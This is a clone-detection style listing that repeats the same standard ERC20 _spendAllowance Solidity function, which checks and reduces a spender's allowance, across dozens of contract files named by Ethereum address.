<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="125" endline="135" pcid="1648">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="125" endline="135" pcid="7074">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="124" endline="134" pcid="6096">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="119" endline="129" pcid="1437">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="124" endline="134" pcid="701">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="122" endline="132" pcid="5837">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="125" endline="135" pcid="470">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="120" endline="130" pcid="4038">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="123" endline="133" pcid="4734">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="127" endline="137" pcid="2206">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="123" endline="133" pcid="5362">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="127" endline="137" pcid="88">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="121" endline="131" pcid="3912">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="124" endline="134" pcid="5947">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="120" endline="130" pcid="8011">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="121" endline="131" pcid="9199">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="125" endline="135" pcid="7598">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="124" endline="134" pcid="2142">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="123" endline="133" pcid="6256">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="120" endline="130" pcid="5681">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="121" endline="131" pcid="7842">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="122" endline="132" pcid="5425">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="121" endline="131" pcid="2117">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="124" endline="134" pcid="7172">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="125" endline="135" pcid="8918">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="122" endline="132" pcid="8386">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="121" endline="131" pcid="6271">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="125" endline="135" pcid="4682">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="130" endline="140" pcid="8774">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="121" endline="131" pcid="7658">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="125" endline="135" pcid="4637">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="126" endline="136" pcid="4247">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="122" endline="132" pcid="5666">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="122" endline="132" pcid="671">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="125" endline="135" pcid="6902">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="125" endline="135" pcid="2102">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="128" endline="138" pcid="6635">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="123" endline="133" pcid="1531">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="126" endline="136" pcid="5696">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="122" endline="132" pcid="4262">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="123" endline="133" pcid="967">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="121" endline="131" pcid="3891">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="125" endline="135" pcid="6618">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="121" endline="131" pcid="8251">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="122" endline="132" pcid="5099">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="125" endline="135" pcid="7981">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="122" endline="132" pcid="5711">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="126" endline="136" pcid="455">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="120" endline="130" pcid="8401">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="124" endline="134" pcid="6172">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="121" endline="131" pcid="3811">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="123" endline="133" pcid="7333">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="224" endline="234" pcid="6740">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="122" endline="132" pcid="6947">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="124" endline="134" pcid="7479">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="118" endline="128" pcid="9082">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="122" endline="132" pcid="3933">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="126" endline="136" pcid="737">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="119" endline="129" pcid="4894">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="122" endline="132" pcid="5537">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="123" endline="133" pcid="1422">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="121" endline="131" pcid="8998">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="119" endline="129" pcid="3734">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="124" endline="134" pcid="8098">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="121" endline="131" pcid="6992">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="125" endline="135" pcid="7449">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="123" endline="133" pcid="3719">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="741" endline="751" pcid="2221">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="128" endline="138" pcid="8744">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="122" endline="132" pcid="5440">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="126" endline="136" pcid="8416">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="123" endline="133" pcid="7287">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
